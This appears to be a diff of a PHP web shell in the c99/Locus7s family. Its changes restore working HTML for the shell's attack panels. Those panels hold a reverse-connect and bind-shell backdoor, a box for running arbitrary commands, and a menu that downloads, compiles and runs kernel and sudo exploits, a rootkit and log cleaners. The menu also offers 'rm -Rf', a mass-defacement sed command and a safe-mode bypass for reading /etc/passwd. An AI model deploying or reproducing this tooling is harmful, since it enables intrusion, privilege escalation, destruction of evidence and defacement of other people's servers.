 "NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
-"ext_tar"=&gt;
+"ext_tar"=>
 "R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
 "Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
 "HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
@@ -3227,15 +3227,15 @@ $images = array(
 "GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
 "HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
 "u4tLAgEAOw==",
-"ext_txt"=&gt;
+"ext_txt"=>
 "R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
 "SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
 "UpPWG3Ig6Hq/XmRjuZwkAAA7",
-"ext_wri"=&gt;
+"ext_wri"=>
 "R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
 "a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
-"ext_xml"=&gt;
+"ext_xml"=>
 "R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
 "gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
 "AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
@@ -3244,20 +3244,20 @@ $images = array(
 );
 //For simple size- and speed-optimization.
 $imgequals = array(
-  "ext_tar"=&gt;array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
-  "ext_php"=&gt;array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
-  "ext_jpg"=&gt;array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
-  "ext_html"=&gt;array("ext_html","ext_htm"),
-  "ext_avi"=&gt;array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
-  "ext_lnk"=&gt;array("ext_lnk","ext_url"),
-  "ext_ini"=&gt;array("ext_ini","ext_css","ext_inf"),
-  "ext_doc"=&gt;array("ext_doc","ext_dot"),
-  "ext_js"=&gt;array("ext_js","ext_vbs"),
-  "ext_cmd"=&gt;array("ext_cmd","ext_bat","ext_pif"),
-  "ext_wri"=&gt;array("ext_wri","ext_rtf"),
-  "ext_swf"=&gt;array("ext_swf","ext_fla"),
-  "ext_mp3"=&gt;array("ext_mp3","ext_au","ext_midi","ext_mid"),
-  "ext_htaccess"=&gt;array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
+  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
+  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
+  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
+  "ext_html"=>array("ext_html","ext_htm"),
+  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
+  "ext_lnk"=>array("ext_lnk","ext_url"),
+  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),
+  "ext_doc"=>array("ext_doc","ext_dot"),
+  "ext_js"=>array("ext_js","ext_vbs"),
+  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
+  "ext_wri"=>array("ext_wri","ext_rtf"),
+  "ext_swf"=>array("ext_swf","ext_fla"),
+  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
+  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
 );
 if (!$getall)
 {
@@ -3266,118 +3266,118 @@ if (!$getall)
   header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
   header("Cache-control: max-age=".(60*60*24*7));
   header("Last-Modified: ".date("r",filemtime(__FILE__)));
-  foreach($imgequals as $k=&gt;$v) {if (in_array($img,$v)) {$img = $k; break;}}
+  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
   if (empty($images[$img])) {$img = "small_unk";}
   if (in_array($img,$ext_tar)) {$img = "ext_tar";}
   echo base64_decode($images[$img]);
 }
 else
 {
-  foreach($imgequals as $a=&gt;$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]&lt;br&gt;");}}}}
+  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
   natsort($images);
   $k = array_keys($images);
-  echo  "&lt;center&gt;";
-  foreach ($k as $u) {echo $u.":&lt;img src=\"".$surl."act=img&img=".$u."\" border=\"1\"&gt;&lt;br&gt;";}
-  echo "&lt;/center&gt;";
+  echo  "<center>";
+  foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}
+  echo "</center>";
 }
 exit;
 }
-if ($act == "about") {echo "&lt;center&gt;&lt;b&gt;Credits:&lt;br&gt;Idea, leading and coding by tristram[CCTeaM].&lt;br&gt;Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].&lt;br&gt;Thanks all who report bugs.&lt;br&gt;All bugs send to tristram's ICQ #656555 &lt;a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"&gt;&lt;img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle&gt;&lt;/a&gt;.&lt;/b&gt;";}
+if ($act == "about") {echo "<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #656555 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle></a>.</b>";}
 if ($act == "backc")
 {
 $ip = $_SERVER["REMOTE_ADDR"];
 $msg = $_POST['backcconnmsg'];
 $emsg = $_POST['backcconnmsge'];
-echo("&lt;center&gt;&lt;b&gt;Back-Connection:&lt;/b&gt;&lt;/br&gt;&lt;/br&gt;&lt;form name=form method=POST&gt;Host:&lt;input type=text name=backconnectip size=15 value=$ip&gt; Port: &lt;input type=text name=backconnectport size=15 value=5992&gt; Use: &lt;select size=1 name=use&gt;&lt;option value=Perl&gt;Perl&lt;/option&gt;&lt;option value=C&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type=submit name=submit value=Connect&gt;&lt;/form&gt;Click 'Connect' only after you open port for it first. Once open, use NetCat, and run '&lt;b&gt;nc -l -n -v -p 5992&lt;/b&gt;'&lt;br&gt;&lt;br&gt;&lt;/center&gt;");
+echo("<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=5992> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>Click 'Connect' only after you open port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 5992</b>'<br><br></center>");
 echo("$msg");
 echo("$emsg");
 }
 if ($act == "shbd"){
 $msg = $_POST['backcconnmsg'];
 $emsg = $_POST['backcconnmsge'];
-echo("&lt;center&gt;&lt;b&gt;Bind Shell Backdoor:&lt;/b&gt;&lt;/br&gt;&lt;/br&gt;&lt;form name=form method=POST&gt;
-Bind Port: &lt;input type='text' name='backconnectport' value='5992'&gt;
-&lt;input type='hidden' name='use' value='shbd'&gt;
-&lt;input type='submit' value='Install Backdoor'&gt;&lt;/form&gt;");
+echo("<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>
+Bind Port: <input type='text' name='backconnectport' value='5992'>
+<input type='hidden' name='use' value='shbd'>
+<input type='submit' value='Install Backdoor'></form>");
 echo("$msg");
 echo("$emsg");
-echo("&lt;/center&gt;");
+echo("</center>");
 } ?>
 
 
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;a bookmark="minipanel"&gt;&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td width="100%" height="1" valign="top" colspan="2"&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>act=cmd" method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;select name="cmd"&gt;<?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?>&lt;/select&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
-&lt;br&gt;
-&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-    &lt;div align="center"&gt;Useful Commands  
-    &lt;/div&gt;
-    &lt;form action="<?php echo $surl; ?>"&gt;
-      &lt;div align="center"&gt;
-        &lt;input type=hidden name=act value="cmd"&gt;
-        &lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
-          &lt;SELECT NAME="cmd"&gt;
-            &lt;OPTION VALUE="uname -a"&gt;Kernel version
-              &lt;OPTION VALUE="w"&gt;Logged in users
-                &lt;OPTION VALUE="lastlog"&gt;Last to connect
-                  &lt;OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&gt; /dev/null"&gt;Suid bins
-                    &lt;OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::"&gt;USER WITHOUT PASSWORD!
-                    &lt;OPTION VALUE="find /etc/ -type f -perm -o+w 2&gt; /dev/null"&gt;Write in /etc/?
-                    &lt;OPTION VALUE="which wget curl w3m lynx"&gt;Downloaders?
-                    &lt;OPTION VALUE="cat /proc/version /proc/cpuinfo"&gt;CPUINFO
-                    &lt;OPTION VALUE="netstat -atup | grep IST"&gt;Open ports
-                    &lt;OPTION VALUE="locate gcc"&gt;gcc installed?
-                    &lt;OPTION VALUE="rm -Rf"&gt;Format box (DANGEROUS)
-                    &lt;OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"&gt;WIPELOGS PT1 (If wget installed)
-                    &lt;OPTION VALUE="gcc zap2.c -o zap2"&gt;WIPELOGS PT2
-                    &lt;OPTION VALUE="./zap2"&gt;WIPELOGS PT3
-                    &lt;OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3"&gt;Kernel attack (Krad.c) PT1 (If wget installed)
-                    &lt;OPTION VALUE="./k3 1"&gt;Kernel attack (Krad.c) PT2 (L1)
-                    &lt;OPTION VALUE="./k3 2"&gt;Kernel attack (Krad.c) PT2 (L2)
-                    &lt;OPTION VALUE="./k3 3"&gt;Kernel attack (Krad.c) PT2 (L3)
-                    &lt;OPTION VALUE="./k3 4"&gt;Kernel attack (Krad.c) PT2 (L4)
-                    &lt;OPTION VALUE="./k3 5"&gt;Kernel attack (Krad.c) PT2 (L5)
-                    &lt;OPTION VALUE="wget http://precision-gaming.com/sudo.c"&gt;wget Linux sudo stack overflow
-                    &lt;OPTION VALUE="gcc sudo.c -o sudosploit"&gt;Compile Linux sudo sploit
-                    &lt;OPTION VALUE="./sudosploit"&gt;Execute Sudosploit
-                    &lt;OPTION VALUE="wget http://twofaced.org/linux2-6-all.c"&gt;Linux Kernel 2.6.* rootkit.c
-                    &lt;OPTION VALUE="gcc linux2-6-all.c -o linuxkernel"&gt;Compile Linux2-6-all.c
-                    &lt;OPTION VALUE="./linuxkernel"&gt;Run Linux2-6-all.c
-                    &lt;OPTION VALUE="wget http://twofaced.org/mig-logcleaner.c"&gt;Mig LogCleaner
-                    &lt;OPTION VALUE="gcc -DLINUX -WALL mig-logcleaner.c -o migl"&gt;Compile Mig LogCleaner
-                    &lt;OPTION VALUE="./migl -u root 0"&gt;Compile Mig LogCleaner
-                    &lt;OPTION VALUE="sed -i -e 's/&lt;html&gt;/&lt;div style=\'position\:absolute\;width\:2000px\;height\:2000px\;background-color\:black\'&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&lt;img src=\'http://img244.imageshack.us/img244/6663/locus7sgm8.jpg\'&gt;&lt;br&gt;&lt;font size=\'10\' color=\'green\'&gt;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&lt;font size=\'10\' color=\'green\'&gt;HACKED BY &lt;a href=\'http\:\/\/locus7s.com\'&gt;LOCUS7S&lt;\/a&gt;&lt;\/font&gt;&lt;\/div&gt;&lt;meta http-equiv=\'refresh\' content=\'5\\;url=http\:\/\/locus7s.com\'&gt;/g' index.*"&gt;index.* Mass Defacement
-                  &lt;/SELECT&gt;
-        &lt;input type=hidden name="cmd_txt" value="1"&gt;
+</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr><td width="100%" height="1" valign="top" colspan="2"></td></tr>
+<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
+<br>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr><td height="1" valign="top" colspan="2"></td></tr>
+<tr>
+  <td width="50%" height="83" valign="top"><center>
+    <div align="center">Useful Commands  
+    </div>
+    <form action="<?php echo $surl; ?>">
+      <div align="center">
+        <input type=hidden name=act value="cmd">
+        <input type=hidden name="d" value="<?php echo $dispd; ?>">
+          <SELECT NAME="cmd">
+            <OPTION VALUE="uname -a">Kernel version
+              <OPTION VALUE="w">Logged in users
+                <OPTION VALUE="lastlog">Last to connect
+                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
+                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
+                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
+                    <OPTION VALUE="which wget curl w3m lynx">Downloaders?
+                    <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
+                    <OPTION VALUE="netstat -atup | grep IST">Open ports
+                    <OPTION VALUE="locate gcc">gcc installed?
+                    <OPTION VALUE="rm -Rf">Format box (DANGEROUS)
+                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
+                    <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
+                    <OPTION VALUE="./zap2">WIPELOGS PT3
+                    <OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed)
+                    <OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1)
+                    <OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2)
+                    <OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3)
+                    <OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4)
+                    <OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5)
+                    <OPTION VALUE="wget http://precision-gaming.com/sudo.c">wget Linux sudo stack overflow
+                    <OPTION VALUE="gcc sudo.c -o sudosploit">Compile Linux sudo sploit
+                    <OPTION VALUE="./sudosploit">Execute Sudosploit
+                    <OPTION VALUE="wget http://twofaced.org/linux2-6-all.c">Linux Kernel 2.6.* rootkit.c
+                    <OPTION VALUE="gcc linux2-6-all.c -o linuxkernel">Compile Linux2-6-all.c
+                    <OPTION VALUE="./linuxkernel">Run Linux2-6-all.c
+                    <OPTION VALUE="wget http://twofaced.org/mig-logcleaner.c">Mig LogCleaner
+                    <OPTION VALUE="gcc -DLINUX -WALL mig-logcleaner.c -o migl">Compile Mig LogCleaner
+                    <OPTION VALUE="./migl -u root 0">Compile Mig LogCleaner
+                    <OPTION VALUE="sed -i -e 's/<html>/<div style=\'position\:absolute\;width\:2000px\;height\:2000px\;background-color\:black\'><br><br><br><br>&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;<img src=\'http://img244.imageshack.us/img244/6663/locus7sgm8.jpg\'><br><font size=\'10\' color=\'green\'>&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;&nbsp\;<font size=\'10\' color=\'green\'>HACKED BY <a href=\'http\:\/\/locus7s.com\'>LOCUS7S<\/a><\/font><\/div><meta http-equiv=\'refresh\' content=\'5\\;url=http\:\/\/locus7s.com\'>/g' index.*">index.* Mass Defacement
+                  </SELECT>
+        <input type=hidden name="cmd_txt" value="1">
         &nbsp;
-        &lt;input type=submit name=submit value="Execute"&gt;
-          &lt;br&gt;
-        Warning. Kernel may be alerted using higher levels &lt;/div&gt;
-    &lt;/form&gt;
-    &lt;/td&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-   &lt;center&gt;Kernel Info: &lt;form name="form1" method="post" action="http://google.com/search"&gt;
-      &lt;input name="q" type="text" id="q" size="80" value="<?php echo wordwrap(php_uname()); ?>"&gt;
-      &lt;input type="hidden" name="client" value="firefox-a"&gt;
-      &lt;input type="hidden" name="rls" value="org.mozilla:en-US:official"&gt;
-      &lt;input type="hidden" name="hl" value="en"&gt;
-      &lt;input type="hidden" name="hs" value="b7p"&gt;
-      &lt;input type=submit name="btnG" VALUE="Search"&gt;
-    &lt;/form&gt;&lt;/center&gt;
-    &lt;/td&gt;
-&lt;/tr&gt;&lt;/TABLE&gt;&lt;br&gt;
-&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-    &lt;div align="center"&gt;Php Safe-Mode Bypass (Read Files)
-    &lt;/div&gt;&lt;br&gt;
-    &lt;form action="<?php echo $surl; ?>"&gt;
-      &lt;div align="center"&gt;
-      File: &lt;input type="text" name="file" method="get"&gt; &lt;input type="submit" value="Read File"&gt;&lt;br&gt;&lt;br&gt; eg: /etc/passwd&lt;br&gt;
+        <input type=submit name=submit value="Execute">
+          <br>
+        Warning. Kernel may be alerted using higher levels </div>
+    </form>
+    </td>
+  <td width="50%" height="83" valign="top"><center>
+   <center>Kernel Info: <form name="form1" method="post" action="http://google.com/search">
+      <input name="q" type="text" id="q" size="80" value="<?php echo wordwrap(php_uname()); ?>">
+      <input type="hidden" name="client" value="firefox-a">
+      <input type="hidden" name="rls" value="org.mozilla:en-US:official">
+      <input type="hidden" name="hl" value="en">
+      <input type="hidden" name="hs" value="b7p">
+      <input type=submit name="btnG" VALUE="Search">
+    </form></center>
+    </td>
+</tr></TABLE><br>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr><td height="1" valign="top" colspan="2"></td></tr>
+<tr>
+  <td width="50%" height="83" valign="top"><center>
+    <div align="center">Php Safe-Mode Bypass (Read Files)
+    </div><br>
+    <form action="<?php echo $surl; ?>">
+      <div align="center">
+      File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
        
        
        
@@ -3392,20 +3392,20 @@ echo("&lt;/center&gt;");
     $temp=tempnam($test, "cx");
     $file=$_GET['file'];    
     $get=htmlspecialchars($file);
-    echo "&lt;br&gt;Trying To Get File &lt;font color=#000099&gt;&lt;b&gt;$get&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
+    echo "<br>Trying To Get File <font color=#000099><b>$get</b></font><br>";
     if(copy("compress.zlib://".$file, $temp)){
     $fichier = fopen($temp, "r");
     $action = fread($fichier, filesize($temp));
     fclose($fichier);
     $source=htmlspecialchars($action);
-    echo "&lt;div class=\"shell\"&gt;&lt;b&gt;Start $get&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;font color=\"white\"&gt;$source&lt;/font&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;Fin &lt;font color=#000099&gt;$get&lt;/font&gt;&lt;/b&gt;";
+    echo "<div class=\"shell\"><b>Start $get</b><br><br><font color=\"white\">$source</font><br><b><br>Fin <font color=#000099>$get</font></b>";
     unlink($temp);
     } else {
-    die("&lt;FONT COLOR=\"RED\"&gt;&lt;CENTER&gt;Sorry... File
-    &lt;B&gt;".htmlspecialchars($file)."&lt;/B&gt; dosen't exists or you don't have
-    access.&lt;/CENTER&gt;&lt;/FONT&gt;");
+    die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
+    <B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
+    access.</CENTER></FONT>");
             }
-    echo "&lt;/div&gt;";
+    echo "</div>";
     }
      
     if(isset($_GET['file']))
@@ -3423,11 +3423,11 @@ rsg_read();
 {
 $chemin=$_GET['directory'];
 $files = glob("$chemin*");
-echo "Trying To List Folder &lt;font color=#000099&gt;&lt;b&gt;$chemin&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
+echo "Trying To List Folder <font color=#000099><b>$chemin</b></font><br>";
 foreach ($files as $filename) {
-    echo "&lt;pre&gt;";
+    echo "<pre>";
    echo "$filename\n";
-   echo "&lt;/pre&gt;";
+   echo "</pre>";
 }
 }
 if(isset($_GET['directory']))
@@ -3435,28 +3435,28 @@ if(isset($_GET['directory']))
 rsg_glob();
 }
 ?>
-          &lt;br&gt;
-      &lt;/div&gt;
-    &lt;/form&gt;
-    &lt;/td&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-   &lt;center&gt;Php Safe-Mode Bypass (List Directories):     &lt;form action="<?php echo $surl; ?>"&gt;
-      &lt;div align="center"&gt;&lt;br&gt;
-      Dir: &lt;input type="text" name="directory" method="get"&gt; &lt;input type="submit" value="List Directory"&gt;&lt;br&gt;&lt;br&gt; eg: /etc/&lt;br&gt;
-    &lt;/form&gt;&lt;/center&gt;
-    &lt;/td&gt;
-&lt;/tr&gt;&lt;/TABLE&gt;
-&lt;br&gt;
-&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;
-&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Search&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="search_name" size="29" value="(.*)"&gt;&nbsp;&lt;input type="checkbox" name="search_name_regexp" value="1"  checked&gt; - regexp&nbsp;&lt;input type=submit name=submit value="Search"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;
